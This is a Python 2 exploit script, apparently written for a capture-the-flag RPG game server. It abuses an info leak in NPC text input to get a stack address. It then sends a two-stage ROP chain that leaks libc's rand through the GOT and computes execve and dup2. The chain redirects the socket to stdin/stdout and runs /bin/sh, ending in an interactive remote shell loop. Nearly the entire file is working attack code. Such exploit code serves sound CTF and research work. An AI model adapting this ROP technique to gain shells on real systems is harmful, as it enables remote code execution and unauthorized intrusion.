import gameapy
import struct
import os, re, sys, time

import rpgaddr


def shellInteractive(sock):
	import select
	while 1:
		inp = raw_input("$ ")
		inp = inp+"\n"

		sock.send(inp)
		while sock in select.select([sock],[],[], 0.5)[0]:
			data = sock.recv(1024)
			if not(data):
				break
			print data,

###############################################
# CONSTANTS HERE
###############################################
HOST = "localhost"
#HOST = "10.12.5.3"
PORT = 8080
USERFD = 4
RPCFD = 5


gotRand = rpgaddr.gotrandAddr
textBufferOffset = 24
invalidStructToReturnOffset = -44
# server values
libcRandOffset = 0x00030480
libcExecveOffset = 0x0009c640
libcDup2Offset = 0x000c39f0
###############################################
# END CONSTANTS
###############################################

libPubPosRe = re.compile("Meticulous Librarian: Here is your\npublication:\n(\S+)")


g = gameapy.DungeonSession(300,300)
g.connectTo(HOST,PORT)

g.navigateToNPC("P")
g.readNPCText()

# first we extract the base stack address of state via info leak
g.enterNPCText("A"*256)
time.sleep(1)

stateAddrRe = re.compile("(....)\x1b\[22")
result = g.con.get_socket().recv(1024)

print repr(result)
res = stateAddrRe.search(result)
if not res:
	print("Could not extract state address")
else:
	addr = res.group(1)
	addr = struct.unpack("<I", addr)[0]
	print repr(addr)
	print("state addr is 0x{:x}".format(addr))


ROPCODE_BASEADDR = addr + textBufferOffset

ROPCODE = (
	"C0DE" +
	# send us ptr to rand function in libc to calc other fns offset
	struct.pack("<I", rpgaddr.pltwriteAddr) +
	struct.pack("<I", rpgaddr.pop12addr) +
	struct.pack("<I", USERFD) +
	struct.pack("<I", gotRand) +
	struct.pack("<I", 4) +
	# now do invalid rpc call to obtain ptr to invalid cmd struct on stack of unrestricted thread
	struct.pack("<I", rpgaddr.symrpccallAddr) +
	struct.pack("<I", rpgaddr.pop8addr) +
	struct.pack("<I", RPCFD) +
	struct.pack("<I", ROPCODE_BASEADDR) +
	# extract pointer from eax to memory
	struct.pack("<I", rpgaddr.gadgets40b031794e3757855539a0757a74b5b8[0]) + # POP EBX ret
	struct.pack("<I", addr - 4) + # prepare to write to the beginning of the state struct
	struct.pack("<I", rpgaddr.gadgets0db1e2041d843b6ad3b94f9f574af076[0]) + # write EAX to [EBX+4]
	# start + 0x34 here
	# this gadget pops additional 28 bytes from stack
	"/bin/sh\x00" +
	"D"*(28 - 8) +
	# start + 0x50 here
	# send leaked address to exploit
	struct.pack("<I", rpgaddr.pltwriteAddr) +
	struct.pack("<I", rpgaddr.pop12addr) +
	struct.pack("<I", USERFD) +
	struct.pack("<I", addr) +
	struct.pack("<I", 4) +
	# read back where to put the new content in rpc thread
	struct.pack("<I", rpgaddr.pltreadAddr) +
	struct.pack("<I", rpgaddr.pop12addr) +
	struct.pack("<I", USERFD) +
	struct.pack("<I", ROPCODE_BASEADDR + 0x84) +
	struct.pack("<I", 4) +
	# now read new content to calculated address in stack of unrestricted thread
	struct.pack("<I", rpgaddr.pltreadAddr) +
	struct.pack("<I", rpgaddr.pop12addr) +
	struct.pack("<I", USERFD) +
	# start + 0x84 here
	struct.pack("<I", 0xDEADC0DE) + # this addr gets later overwritten
	struct.pack("<I", 4*17) + # length of ROPSTAGE 2
	# trigger rpc
	struct.pack("<I", rpgaddr.symrpccallAddr) +
	struct.pack("<I", rpgaddr.pop8addr) +
	struct.pack("<I", RPCFD) +
	struct.pack("<I", ROPCODE_BASEADDR)
	)
SETUPGADET = struct.pack("<I", rpgaddr.pop124addr)

ROPCODE = ROPCODE + "?"*(256 + 4 - len(ROPCODE)) + SETUPGADET

print("ROPCODE is " + ROPCODE.encode("hex"))

assert ROPCODE.find("\x7F") < 0
assert ROPCODE.find("\r") < 0
assert len(ROPCODE) == 256 + 8

# note that transport encoding is done by library

g.navigateToNPC("P")
g.con.write(ROPCODE + "\r\x00")

# eat everything until \x1b[?25l
text = ""
while not text.endswith("\x1b[?25l"):
	text = text + g.con.get_socket().recv(1)
print("ate damn npc output")

bla = raw_input("debug (press key to continue)")
res = g.con.get_socket().recv(4)

#for i in range(5):
#	res = g.con.get_socket().recv(4)
#	writeAddrInLIBC = struct.unpack("<I", res)[0]
#	print("got addr: 0x{0:x}".format(writeAddrInLIBC))

randAddrInLIBC = struct.unpack("<I", res)[0]
print("Rand addr @libc: 0x{0:x}".format(randAddrInLIBC))
execveAddrInLIBC = randAddrInLIBC - libcRandOffset + libcExecveOffset
print("(guessed) Execve addr @libc: 0x{0:x}".format(execveAddrInLIBC))
dup2AddrInLIBC = randAddrInLIBC - libcRandOffset + libcDup2Offset
print("(guessed) dup2 addr @libc: 0x{0:x}".format(dup2AddrInLIBC))

ROPSTAGE2 = (
	# dup socket to stdin and stdout
	struct.pack("<I", dup2AddrInLIBC) +
	struct.pack("<I", rpgaddr.pop8addr) +
	struct.pack("<I", USERFD) +
	struct.pack("<I", 0) +
	struct.pack("<I", rpgaddr.pop12addr) +
	"DEADCODEBEEF" + # this is the stack area where the read in unrestricted thread writes to - it gets dirty upon read() return after triggering of rpc functionality - so fill it with garbage and don't use it in the rop chain
	struct.pack("<I", dup2AddrInLIBC) +
	struct.pack("<I", rpgaddr.pop8addr) +
	struct.pack("<I", 0) +
	struct.pack("<I", 1) +
	# open shell
	struct.pack("<I", execveAddrInLIBC) +
	struct.pack("<I", rpgaddr.pop12addr) +
	struct.pack("<I", ROPCODE_BASEADDR + 0x34) +
	struct.pack("<I", 0) +
	struct.pack("<I", 0) 
)


res = g.con.get_socket().recv(4)

invalidStructAddr = struct.unpack("<I", res)[0]
print("Invalid struct addr: 0x{0:x}".format(invalidStructAddr))

rpcCallbackAddr = invalidStructAddr + invalidStructToReturnOffset
print("Computed callback point of rpc: 0x{:x}".format(rpcCallbackAddr))
g.con.get_socket().send(struct.pack("<I",rpcCallbackAddr))

print("ROPSTAGE2 is " + ROPSTAGE2.encode("hex"))
g.con.get_socket().send(ROPSTAGE2)

shellInteractive(g.con.get_socket())

sys.exit(0)
